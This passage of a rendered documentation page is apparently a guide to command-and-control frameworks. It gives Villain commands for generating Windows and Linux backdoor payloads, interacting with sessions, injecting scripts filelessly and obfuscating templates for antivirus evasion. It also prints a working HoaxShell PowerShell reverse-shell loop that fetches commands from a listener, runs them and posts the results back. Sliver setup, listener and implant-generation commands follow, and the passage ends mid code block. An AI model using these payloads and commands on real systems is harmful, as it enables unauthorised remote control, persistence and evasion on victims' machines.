plain"> Villain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">pip3 </span><span class="token function" style="color:rgb(80, 250, 123)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> requirements.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start Villain server</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">villain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start with custom ports</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">villain </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">65001</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-x</span><span class="token plain"> </span><span class="token number">8080</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-n</span><span class="token plain"> </span><span class="token number">4444</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> </span><span class="token number">8888</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start with SSL support for HoaxShell HTTPS</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">villain </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> cert.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-k</span><span class="token plain"> key.pem</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="72-payload-generation-and-management">7.2 Payload Generation and Management<a href="#72-payload-generation-and-management" class="hash-link" aria-label="Direct link to 7.2 Payload Generation and Management" title="Direct link to 7.2 Payload Generation and Management" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Generate Windows PowerShell payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">os</span><span class="token operator">=</span><span class="token plain">windows </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">lhost</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token plain">.1.100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate Linux payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">os</span><span class="token operator">=</span><span class="token plain">linux </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">lhost</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token plain">.1.100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate HoaxShell payload (HTTP)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">os</span><span class="token operator">=</span><span class="token plain">windows </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">lhost</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">payload</span><span class="token operator">=</span><span class="token plain">hoaxshell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate HoaxShell HTTPS payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">os</span><span class="token operator">=</span><span class="token plain">windows </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">lhost</span><span class="token operator">=</span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">payload</span><span class="token operator">=</span><span class="token plain">hoaxshell-ssl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List all backdoor payloads</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> backdoors</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active sessions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> sessions</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="73-session-management-and-interaction">7.3 Session Management and Interaction<a href="#73-session-management-and-interaction" class="hash-link" aria-label="Direct link to 7.3 Session Management and Interaction" title="Direct link to 7.3 Session Management and Interaction" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Connect to a session</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> shell </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Execute commands in pseudo-shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shell </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shell </span><span class="token operator">&gt;</span><span class="token plain"> ipconfig /all</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shell </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">netstat</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-an</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Upload files via HTTP File Smuggler</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shell </span><span class="token operator">&gt;</span><span class="token plain"> upload /path/to/local/file.exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Inject and execute scripts fileless</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">shell </span><span class="token operator">&gt;</span><span class="token plain"> inject /path/to/script.ps1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Invoke ConPtyShell for fully interactive shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> conptyshell </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Exit without terminating sessions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> flee</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="74-collaborative-features-and-sibling-servers">7.4 Collaborative Features and Sibling Servers<a href="#74-collaborative-features-and-sibling-servers" class="hash-link" aria-label="Direct link to 7.4 Collaborative Features and Sibling Servers" title="Direct link to 7.4 Collaborative Features and Sibling Servers" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Connect to another Villain instance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> connect </span><span class="token number">192.168</span><span class="token plain">.1.200:65001</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Share sessions with connected siblings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Send messages to all connected siblings</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">#Team message here</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List connected sibling servers</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> siblings</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Disconnect from sibling</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> disconnect </span><span class="token number">192.168</span><span class="token plain">.1.200</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="75-advanced-villain-techniques">7.5 Advanced Villain Techniques<a href="#75-advanced-villain-techniques" class="hash-link" aria-label="Direct link to 7.5 Advanced Villain Techniques" title="Direct link to 7.5 Advanced Villain Techniques" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Session persistence and metadata</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Villain automatically stores session metadata</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Allows re-establishment of HoaxShell sessions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Purge all session metadata</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Villain </span><span class="token operator">&gt;</span><span class="token plain"> purge</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Custom obfuscation for AV evasion</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Edit templates in /Core/payload_templates/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Replace with obfuscated versions</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Background execution with compression</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">villain </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-p</span><span class="token plain"> </span><span class="token number">65001</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--quiet</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--compress</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Multi-handler configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># config.yml example:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">handlers:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  - port: </span><span class="token number">8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    type: http</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    auth: user:pass</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  - port: </span><span class="token number">443</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    type: https</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cert: cert.pem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    key: key.pem</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="76-hoaxshell-integration">7.6 HoaxShell Integration<a href="#76-hoaxshell-integration" class="hash-link" aria-label="Direct link to 7.6 HoaxShell Integration" title="Direct link to 7.6 HoaxShell Integration" translate="no">‚Äã</a></h3>
<p>HoaxShell payloads use HTTP(S) to establish beacon-like reverse shells, making them particularly effective against restrictive firewalls:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Example HoaxShell payload structure (simplified)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$s=&#x27;192.168.1.100:8080&#x27;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$i=&#x27;session-id&#x27;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">while($true){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    $c=(Invoke-WebRequest -UseBasicParsing -Uri $s -Headers @{&quot;Authorization&quot;=$i}).Content;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    if($c -ne &#x27;None&#x27;) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $r=Invoke-Expression $c 2&gt;&amp;1 | Out-String;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Invoke-WebRequest -Uri $s -Method POST -Headers @{&quot;Authorization&quot;=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($r))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    Start-Sleep -Seconds 0.8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="8-sliver-framework-modern-go-based-c2-with-advanced-pivoting">8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting<a href="#8-sliver-framework-modern-go-based-c2-with-advanced-pivoting" class="hash-link" aria-label="Direct link to 8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting" title="Direct link to 8. Sliver Framework: Modern Go-Based C2 with Advanced Pivoting" translate="no">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>Sliver requires downloading the appropriate binary for your platform from the official releases. Replace all example IPs, domains, and file paths with your specific values. Session mode is required for pivoting and SOCKS proxy features.</p></div></div>
<p>Sliver is an open-source, cross-platform C2 framework written in Go, providing fast, portable, and extensible capabilities for adversarial operations.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="81-server-setup-and-configuration">8.1 Server Setup and Configuration<a href="#81-server-setup-and-configuration" class="hash-link" aria-label="Direct link to 8.1 Server Setup and Configuration" title="Direct link to 8.1 Server Setup and Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Download and install Sliver</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">wget</span><span class="token plain"> https://github.com/BishopFox/sliver/releases/download/v1.5.x/sliver-server_linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">chmod</span><span class="token plain"> +x sliver-server_linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./sliver-server_linux</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start server in daemon mode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./sliver-server_linux daemon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Configure multiplayer mode</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./sliver-server_linux operator </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--name</span><span class="token plain"> operator1 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">31337</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Connect as operator</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">./sliver-client_linux </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--config</span><span class="token plain"> operator1.cfg</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="82-listener-configuration">8.2 Listener Configuration<a href="#82-listener-configuration" class="hash-link" aria-label="Direct link to 8.2 Listener Configuration" title="Direct link to 8.2 Listener Configuration" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start HTTP listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> http </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--domain</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start HTTPS listener with custom certificate</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> https </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--domain</span><span class="token plain"> secure.example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--cert</span><span class="token plain"> cert.pem </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--key</span><span class="token plain"> key.pem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start DNS listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> dns </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--domains</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start mutual TLS listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> mtls </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">8888</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Start WireGuard listener</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> wg </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lhost</span><span class="token plain"> </span><span class="token number">192.168</span><span class="token plain">.1.100 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--lport</span><span class="token plain"> </span><span class="token number">51820</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># List active listeners</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">jobs</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="83-implant-generation">8.3 Implant Generation<a href="#83-implant-generation" class="hash-link" aria-label="Direct link to 8.3 Implant Generation" title="Direct link to 8.3 Implant Generation" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Generate session implant (interactive)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> amd64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--format</span><span class="token plain"> exe</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate beacon implant (callback intervals)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sliver </span><span class="token operator">&gt;</span><span class="token plain"> generate beacon </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--http</span><span class="token plain"> example.com </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--os</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--arch</span><span class="token plain"> amd64 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--seconds</span><span class="token plain"> </span><span class="token number">60</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--jitter</span><span class="token plain"> </span><span class="token number">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Generate staged payload</span><span class="token plain"></span><br></span><span class="token-line" 